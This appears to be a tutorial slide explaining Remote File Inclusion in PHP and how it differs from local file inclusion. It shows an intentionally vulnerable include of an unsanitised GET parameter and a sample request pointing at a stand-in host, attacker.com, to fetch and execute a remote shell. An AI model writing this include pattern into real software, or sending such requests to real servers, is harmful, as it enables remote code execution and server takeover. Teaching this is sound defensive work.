Core Concept

Remote File Inclusion (RFI)

Executing Attacker-Controlled Remote Code

RFI is a more dangerous variant of file inclusion where the application includes files from a remote server controlled by the attacker. This typically requires allow_url_include to be enabled in php.ini.

Key Difference from LFI

Unlike LFI, which uses local files, RFI fetches and executes files from an external, attacker-controlled domain, leading to immediate remote code execution.

Key Takeaway

RFI allows a vulnerable application to download and execute arbitrary code from a remote server, granting attackers full control, typically when allow_url_include is enabled.

RFI Exploitation: Including a Remote Shell
Vulnerable PHP Code
<?php include($_GET['page'] . '.php'); ?>
Attacker's Request
GET /index.php?page=http://attacker.com/malicious_shell HTTP/1.1
Host: example.com
Result: Server downloads and executes malicious_shell from attacker.com, granting RCE.
